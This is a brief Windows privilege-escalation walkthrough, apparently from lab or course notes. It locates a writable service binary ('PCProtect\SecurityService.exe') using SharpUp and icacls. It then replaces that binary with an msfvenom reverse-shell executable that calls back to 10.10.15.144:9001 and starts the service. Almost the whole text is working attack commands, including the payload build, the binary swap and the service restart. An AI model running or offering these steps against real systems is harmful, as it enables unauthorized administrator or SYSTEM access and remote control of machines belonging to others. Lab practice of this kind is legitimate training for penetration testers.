
**Find it (SharpUp)**

```
.\SharpUp.exe audit
```

Look under "Modifiable Service Binaries."

**Verify with icacls**

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Red flag: `Everyone:(F)` or `BUILTIN\Users:(F)` — full control granted to anyone.

### Exploit

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.144 LPORT=9001 -f exe > SecurityService.exe
```

```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

```
sc start SecurityService
```

Swap your `SecurityService.exe` for a msfvenom payload first, same as the UAC lab — reverse shell or "add user to admins" binary.

